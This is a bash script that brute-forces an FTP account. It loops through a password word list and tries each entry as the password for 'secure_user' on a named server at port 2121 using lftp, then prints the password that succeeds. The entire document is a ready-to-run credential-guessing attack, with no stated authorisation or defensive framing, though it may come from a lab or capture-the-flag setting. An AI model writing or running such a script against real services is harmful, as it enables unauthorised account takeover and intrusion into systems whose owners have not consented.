#!/bin/bash

# FTP server details
ftp_server="services.cyberprotection.agency"
ftp_port="2121"
ftp_user="secure_user"

# Path to the word list file
word_list="word-list.txt"

# Loop through each line in the word list file
while IFS= read -r password; do
    # Attempt to login using lftp in passive mode
    lftp -u "$ftp_user,$password" -e "set ftp:passive-mode true; quit" "ftp://$ftp_server:$ftp_port" &>/dev/null

    # Check the exit status of lftp
    if [ $? -eq 0 ]; then
        echo "Password found: $password"
        exit 0  # Exit the script if the correct password is found
    else
        echo "Attempt with password $password failed"
    fi
done < "$word_list"

echo "Password not found in the word list."
exit 1

